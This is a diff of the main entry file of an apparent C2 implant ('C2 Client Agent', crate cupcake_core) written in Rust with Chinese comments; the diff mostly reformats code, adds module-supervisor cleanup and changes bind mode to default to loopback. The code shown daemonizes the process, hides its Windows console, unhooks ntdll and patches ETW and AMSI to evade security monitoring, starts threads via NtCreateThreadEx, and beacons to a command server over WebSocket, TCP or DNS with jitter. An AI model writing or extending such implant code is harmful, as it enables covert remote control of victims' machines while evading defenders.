@@ -1,5 +1,5 @@
 // C2 Client Agent - 主程序入口
-// 
+//
 // 这是一个轻量级的 C2 受控端程序，通过多种传输协议连接到服务端，
 // 接收并执行命令，然后将结果返回给服务端。
 //
@@ -13,9 +13,9 @@
 // - 可修补的服务器配置
 
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
- 
+
 #[allow(unused_imports)]
-use cupcake_core::{Result, stealth};
+use cupcake_core::{stealth, Result};
 #[allow(unused_imports)]
 use log::info;
 
@@ -24,21 +24,21 @@ fn daemonize() {
     unsafe {
         // 第一阶段 fork：创建子进程
         match libc::fork() {
-            -1 => return, // 错误
-            0 => {},      // 子进程继续
+            -1 => return,               // 错误
+            0 => {}                     // 子进程继续
             _ => std::process::exit(0), // 父进程退出
         }
-        
+
         // 创建新会话，摆脱控制终端
         libc::setsid();
-        
+
         // 第二阶段 fork：确保不会重新获取控制终端
         match libc::fork() {
             -1 => return,
-            0 => {},
+            0 => {}
             _ => std::process::exit(0),
         }
-        
+
         // 重定向标准流到 /dev/null
         if let Ok(dev_null) = std::fs::File::open("/dev/null") {
             use std::os::unix::io::AsRawFd;
@@ -76,7 +76,8 @@ fn main() {
         // Initialize env_logger only when the `logging` feature is compiled in.
         #[cfg(feature = "logging")]
         {
-            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
+                .init();
         }
     }
 
@@ -102,7 +103,7 @@ fn main() {
     // 4. Optional ETW/AMSI — ONLY with feature stealth-adv (full profile).
     // Default minimal/standard must NEVER enable this (high EDR signature).
     #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
-    {
+    unsafe {
         let _ = stealth::unhook_ntdll();
         stealth::patch_etw();
         stealth::patch_amsi();
@@ -117,11 +118,12 @@ fn main() {
     #[cfg(target_os = "windows")]
     unsafe {
         // COINIT_MULTITHREADED = 0x0
-        type CoInitializeExFn =
-            unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
+        // Console agents often lack ole32/combase until LoadLibrary.
+        type CoInitializeExFn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
         let mut done = false;
         for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
-            let base = cupcake_core::stealth::get_module_base(
+            let base = cupcake_core::stealth::ensure_module_base(
+                dll,
                 cupcake_core::stealth::hash_module_name(dll),
             );
             if base == 0 {
@@ -157,20 +159,26 @@ fn main() {
             let rt = match build_runtime() {
                 Ok(r) => r,
                 Err(e) => {
-                    cupcake_core::utils::db_print(&format!("[FATAL] Failed to create tokio runtime: {}", e));
+                    cupcake_core::utils::db_print(&format!(
+                        "[FATAL] Failed to create tokio runtime: {}",
+                        e
+                    ));
                     return 1;
                 }
             };
 
             rt.block_on(async {
                 if let Err(e) = run().await {
-                    cupcake_core::utils::db_print(&format!("[FATAL] Agent run loop failed: {:?}", e));
+                    cupcake_core::utils::db_print(&format!(
+                        "[FATAL] Agent run loop failed: {:?}",
+                        e
+                    ));
                 }
             });
 
             0
         }
-        
+
         // Prefer NtCreateThreadEx (syscall); no CreateThread IAT dependency.
         // stack_size=0 → OS default (do NOT pass large commit with 0 reserve:
         // Server 2012 R2 / Win8.1 reject or mis-handle commit>reserve).
@@ -181,10 +189,7 @@ fn main() {
         ) {
             Ok(h) => h,
             Err(e) => {
-                cupcake_core::utils::db_print(&format!(
-                    "[FATAL] NtCreateThreadEx failed: {}",
-                    e
-                ));
+                cupcake_core::utils::db_print(&format!("[FATAL] NtCreateThreadEx failed: {}", e));
                 return;
             }
         };
@@ -223,7 +228,7 @@ fn build_runtime() -> std::result::Result<tokio::runtime::Runtime, std::io::Erro
 
 /// 主运行逻辑
 async fn run() -> Result<()> {
-    // 💤 1. Sleep Delay (+ Stage0 OPSEC jitter when beacon profile)
+    // 💤 1. Sleep Delay (legacy path if module-loader without post-ex; product minimal uses sleep_time)
     #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
     {
         let delay_ms = cupcake_core::module_loader::stage0_startup_delay_ms();
@@ -243,21 +248,24 @@ async fn run() -> Result<()> {
 
     // 🆔 预计算并缓存 Agent UUID
     cupcake_core::get_agent_uuid();
-    
+
     // 1️⃣ WebSocket Entry Point
     #[cfg(feature = "ws")]
     {
         return run_websocket_mode().await;
     }
-    
+
     // 2️⃣ TCP Entry Point (Medium Priority)
     #[cfg(all(feature = "tcp", not(feature = "ws")))]
     {
         return run_tcp_mode().await;
     }
-    
+
     // 3️⃣ DNS Entry Point (Lowest Priority)
-    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))))]
+    #[cfg(all(
+        feature = "dns",
+        not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))
+    ))]
     {
         return run_dns_mode().await;
     }
@@ -268,13 +276,11 @@ async fn run() -> Result<()> {
         info!("Running in TCP Bind (Forward) mode");
         return run_bind_mode().await;
     }
-    
+
     // ⚠️ Safety check: What if no feature is selected?
     #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
     {
-        return Err(ClientError::ConnectionError(
-            "no_protocol".to_string()
-        ));
+        return Err(ClientError::ConnectionError("no_protocol".to_string()));
     }
 }
 
@@ -283,9 +289,9 @@ async fn run() -> Result<()> {
 #[allow(dead_code)]
 async fn run_websocket_mode() -> Result<()> {
     use cupcake_core::config::{get_server_url, validate_server_url};
+    use cupcake_core::fallback::{FallbackManager, FallbackState};
     use cupcake_core::transport::create_transport;
     use cupcake_core::{ClientError, Transport};
-    use cupcake_core::fallback::{FallbackManager, FallbackState};
 
     let server_url = get_server_url();
     // println!("[*] Target C2 Server: {}", server_url);
@@ -384,6 +390,9 @@ async fn run_websocket_mode() -> Result<()> {
             handler.run().await
         };
 
+        // Session ended — clear staged worker PE / supervisor bookkeeping.
+        cupcake_core::module_supervisor::supervisor().stop_all();
+
         match run_result {
             Ok(returned_transport) => {
                 transport = returned_transport;
@@ -412,10 +421,10 @@ async fn run_tcp_mode() -> Result<()> {
     use cupcake_core::config::get_server_url;
     use cupcake_core::handler::MessageHandler;
     use cupcake_core::transport::{create_transport, Transport};
-    
+
     let server_url = get_server_url();
     let mut clean_url = server_url.clone();
-    
+
     if clean_url.starts_with("ws://") {
         clean_url = clean_url.replace("ws://", "");
     } else if clean_url.starts_with("wss://") {
@@ -427,19 +436,19 @@ async fn run_tcp_mode() -> Result<()> {
     if let Some(pos) = clean_url.find('/') {
         clean_url = clean_url[..pos].to_string();
     }
-    
+
     let tcp_url = format!("tcp://{}", clean_url);
-    
-     let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
-         Ok(t) => t,
-         Err(e) => {
-             return Err(e);
-         }
-     };
+
+    let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
+        Ok(t) => t,
+        Err(e) => {
+            return Err(e);
+        }
+    };
 
     // 使用指数退避重连策略（与 WS 模式一致）
     let mut backoff = cupcake_core::ExponentialBackoff::new();
-    
+
     loop {
         if let Err(_) = transport.connect().await {
             let delay = backoff.next_delay();
@@ -448,17 +457,19 @@ async fn run_tcp_mode() -> Result<()> {
             tokio::time::sleep(delay + tokio::time::Duration::from_millis(jitter_ms)).await;
             continue;
         }
-        
+
         // 连接成功：重置退避
         backoff.reset();
-        
+
         let handler = MessageHandler::new(transport);
-        
+
         match handler.run().await {
             Ok(returned_transport) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 transport = returned_transport;
             }
             Err(_) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 loop {
                     match create_transport(&tcp_url) {
                         Ok(t) => {
@@ -473,7 +484,7 @@ async fn run_tcp_mode() -> Result<()> {
                 }
             }
         }
-        
+
         tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
     }
 }
@@ -485,11 +496,11 @@ async fn run_dns_mode() -> Result<()> {
     use cupcake_core::config::get_server_url;
     use cupcake_core::handler::MessageHandler;
     use cupcake_core::transport::{create_transport, Transport};
-    
+
     let server_url = get_server_url();
-    
+
     let mut clean_url = server_url.clone();
-    
+
     if clean_url.starts_with("ws://") {
         clean_url = clean_url.replace("ws://", "");
     } else if clean_url.starts_with("wss://") {
@@ -501,27 +512,29 @@ async fn run_dns_mode() -> Result<()> {
     if let Some(pos) = clean_url.find('/') {
         clean_url = clean_url[..pos].to_string();
     }
-    
+
     let dns_url = format!("dns://{}", clean_url);
-    
+
     let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
         Ok(t) => t,
         Err(e) => return Err(e),
     };
-    
+
     loop {
         if let Err(_) = transport.connect().await {
             tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
             continue;
         }
-        
+
         let handler = MessageHandler::new(transport);
-        
+
         match handler.run().await {
             Ok(returned_transport) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 transport = returned_transport;
             }
             Err(_) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 loop {
                     match create_transport(&dns_url) {
                         Ok(t) => {
@@ -535,7 +548,7 @@ async fn run_dns_mode() -> Result<()> {
                 }
             }
         }
-        
+
         tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
     }
 }
@@ -548,7 +561,7 @@ async fn run_bind_mode() -> Result<()> {
 
     let bind_addr = get_server_url();
     let mut clean_url = bind_addr.clone();
-    
+
     // 清除一切可能的前缀
     if clean_url.starts_with("ws://") {
         clean_url = clean_url.replace("ws://", "");
@@ -565,9 +578,21 @@ async fn run_bind_mode() -> Result<()> {
         clean_url = clean_url[..pos].to_string();
     }
 
-    // 默认绑定所有网卡 (如果原来是 127.0.0.1 或仅包含端口，修正为 0.0.0.0)
-    let port = clean_url.split(':').last().unwrap_or(&clean_url);
-    let bind_url = format!("bind://0.0.0.0:{}", port);
+    // Preserve the configured bind host. Default to loopback when only a port
+    // is given; explicit 0.0.0.0 must be chosen by the operator so bind mode
+    // does not silently expose a control listener on every interface.
+    let (host, port) = if let Some(idx) = clean_url.rfind(':') {
+        let h = &clean_url[..idx];
+        let p = &clean_url[idx + 1..];
+        if h.is_empty() {
+            ("127.0.0.1", p)
+        } else {
+            (h, p)
+        }
+    } else {
+        ("127.0.0.1", clean_url.as_str())
+    };
+    let bind_url = format!("bind://{}:{}", host, port);
 
     let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;
 
@@ -580,9 +605,11 @@ async fn run_bind_mode() -> Result<()> {
         let handler = MessageHandler::new(transport);
         match handler.run().await {
             Ok(returned_transport) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 transport = returned_transport;
             }
             Err(_) => {
+                cupcake_core::module_supervisor::supervisor().stop_all();
                 transport = create_transport(&bind_url)?;
             }
         }
